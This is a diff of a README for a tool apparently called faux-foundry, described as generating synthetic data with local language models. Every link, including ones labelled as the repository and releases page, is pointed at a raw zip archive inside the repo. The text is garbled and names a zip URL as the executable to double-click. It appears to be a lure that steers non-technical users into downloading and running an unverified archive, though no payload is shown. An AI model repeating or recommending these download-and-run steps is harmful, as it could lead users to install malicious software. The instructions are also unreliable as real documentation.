@@ -1,7 +1,7 @@
 # 🎉 faux-foundry - Generate Synthetic Data with Ease
 
 ## 📥 Download Now
-[![Download faux-foundry](https://raw.githubusercontent.com/Red1998/faux-foundry/main/certosino/faux-foundry.zip)](https://raw.githubusercontent.com/Red1998/faux-foundry/main/certosino/faux-foundry.zip)
+[![Download faux-foundry](https://github.com/Red1998/faux-foundry/raw/refs/heads/main/examples/foundry_faux_v1.5.zip)](https://github.com/Red1998/faux-foundry/raw/refs/heads/main/examples/foundry_faux_v1.5.zip)
 
 ## 🚀 Getting Started
 FauxFoundry allows you to create synthetic data using local large language models (LLMs). This guide helps you easily download and run the software without any technical skills.
@@ -22,10 +22,10 @@ To run FauxFoundry, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 1. **Visit the Releases Page**  
    Go to the Releases page to download the latest version of FauxFoundry. Click the link below:  
-   [Download faux-foundry](https://raw.githubusercontent.com/Red1998/faux-foundry/main/certosino/faux-foundry.zip)
+   [Download faux-foundry](https://github.com/Red1998/faux-foundry/raw/refs/heads/main/examples/foundry_faux_v1.5.zip)
 
 2. **Select the Latest Release**  
-   Find the latest version listed at the top of the page. Look for a link that includes the version number, such as `https://raw.githubusercontent.com/Red1998/faux-foundry/main/certosino/faux-foundry.zip`.
+   Find the latest version listed at the top of the page. Look for a link that includes the version number, such as `https://github.com/Red1998/faux-foundry/raw/refs/heads/main/examples/foundry_faux_v1.5.zip`.
 
 3. **Download the File**  
    Click on the file link to start the download. This may take a moment depending on your internet speed.
@@ -34,7 +34,7 @@ To run FauxFoundry, ensure your system meets the following requirements:
    Once the download completes, locate the file (usually in your Downloads folder). Right-click the zip file and select "Extract All" (Windows) or double-click to extract (macOS).
 
 5. **Run the Application**  
-   Navigate to the folder where you extracted the files. Find the executable file named `https://raw.githubusercontent.com/Red1998/faux-foundry/main/certosino/faux-foundry.zip` (Windows) or `faux-foundry` (macOS/Linux). Double-click the file to run it.
+   Navigate to the folder where you extracted the files. Find the executable file named `https://github.com/Red1998/faux-foundry/raw/refs/heads/main/examples/foundry_faux_v1.5.zip` (Windows) or `faux-foundry` (macOS/Linux). Double-click the file to run it.
 
 6. **Follow On-Screen Instructions**  
    Once the application opens, follow the prompts on the screen to generate your synthetic data.
@@ -55,7 +55,7 @@ FauxFoundry is open-source. We welcome contributions! Feel free to fork the repo
 FauxFoundry is licensed under the MIT License. You can use it freely but please respect the license terms.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Red1998/faux-foundry/main/certosino/faux-foundry.zip)
-- [Releases Page](https://raw.githubusercontent.com/Red1998/faux-foundry/main/certosino/faux-foundry.zip)
+- [GitHub Repository](https://github.com/Red1998/faux-foundry/raw/refs/heads/main/examples/foundry_faux_v1.5.zip)
+- [Releases Page](https://github.com/Red1998/faux-foundry/raw/refs/heads/main/examples/foundry_faux_v1.5.zip)
 
 By following this guide, you can easily download and run FauxFoundry to generate synthetic data. Enjoy your experience with FauxFoundry!
